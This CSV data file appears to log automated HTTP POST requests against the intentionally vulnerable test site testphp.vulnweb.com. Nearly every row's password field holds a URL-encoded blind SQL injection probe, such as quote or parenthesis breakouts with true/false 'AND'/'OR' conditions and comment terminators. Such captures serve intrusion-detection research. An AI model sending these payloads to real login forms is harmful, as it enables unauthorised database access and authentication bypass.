,url,method,body,Content-Length,Host,Cache-Control,Origin,Content-Type,Upgrade-Insecure-Requests,User-Agent,Accept,Sec-GPC,Accept-Language,Referer,Accept-Encoding,Connection,Cookie
285,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20IN%20BOOLEAN%20MODE%29%20AND%206510%3D5790%23,76,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
286,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%27%20IN%20BOOLEAN%20MODE%29%20AND%204426%3D4426%23,76,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
287,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%20AND%208988%3D9244%23,51,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
288,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%20AND%208988%3D9244%23,51,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
289,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%20AND%204426%3D4426%23,51,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
290,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%20AND%204426%3D4426%23,51,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
291,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%20AND%201824%3D3021%23,54,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
292,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%20AND%201824%3D3021%23,54,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
293,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%20AND%204426%3D4426%23,54,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
294,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%20AND%204426%3D4426%23,54,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
295,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%29%20AND%208232%3D5673%23,57,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
296,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%29%20AND%208232%3D5673%23,57,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
297,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%29%20AND%204426%3D4426%23,57,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
298,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%29%20AND%204426%3D4426%23,57,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
299,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%20AND%203497%3D1983%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
300,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%20AND%203497%3D1983%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
301,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%20AND%204426%3D4426%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
302,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%20AND%204426%3D4426%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
303,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%20AS%20OWgh%20WHERE%201610%3D1610%20AND%208543%3D6409%23,88,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
304,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%20AS%20OWgh%20WHERE%201610%3D1610%20AND%208543%3D6409%23,88,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
305,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%20AS%20aLOU%20WHERE%203748%3D3748%20AND%204426%3D4426%23,88,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
306,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%29%20AS%20aLOU%20WHERE%203748%3D3748%20AND%204426%3D4426%23,88,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
307,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%20AS%20VfTa%20WHERE%209074%3D9074%20AND%206175%3D1578%23,85,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
308,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%20AS%20VfTa%20WHERE%209074%3D9074%20AND%206175%3D1578%23,85,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
309,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%29%20AS%20BgYb%20WHERE%204439%3D4439%20AND%204426%3D4426%23,85,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
310,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%29%20AS%20BgYb%20WHERE%204439%3D4439%20AND%204426%3D4426%23,85,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
311,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%60%20WHERE%202893%3D2893%20AND%208329%3D9189%23,73,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
312,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%60%20WHERE%202893%3D2893%20AND%208329%3D9189%23,73,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
313,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%60%20WHERE%201931%3D1931%20AND%204426%3D4426%23,73,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
314,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%60%20WHERE%201931%3D1931%20AND%204426%3D4426%23,73,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
315,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%60%29%20WHERE%207185%3D7185%20AND%203773%3D4530%23,76,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
316,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%60%29%20WHERE%207185%3D7185%20AND%203773%3D4530%23,76,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
317,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=fsdfsdf%60%29%20WHERE%207860%3D7860%20AND%204426%3D4426%23,76,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
318,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=fsdfsdf%60%29%20WHERE%207860%3D7860%20AND%204426%3D4426%23,76,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
319,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=-9621,23,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
320,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=-9621,23,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
321,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=-7995%27%29%20OR%204199%3D6309%23,51,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
322,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=-7423%27%29%20OR%206352%3D6352%23,51,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
323,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=-7207%27%20OR%202423%3D3216%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
324,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=-7207%27%20OR%202423%3D3216%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
325,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=-9004%27%20OR%206352%3D6352%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
326,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=-7170%27%20OR%209040%3D5689%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
327,http://testphp.vulnweb.com/login.php,POST,uname=fdsfds&pass=-7170%27%20OR%209040%3D5689%23,48,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
328,http://testphp.vulnweb.com/userinfo.php,POST,uname=fdsfds&pass=-4800%27%20USymSOXIJM%23,42,testphp.vulnweb.com,max-age=0,http://testphp.vulnweb.com,application/x-www-form-urlencoded,1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",1,"en-US,en;q=0.5",http://testphp.vulnweb.com/login.php,"gzip, deflate, br",close,
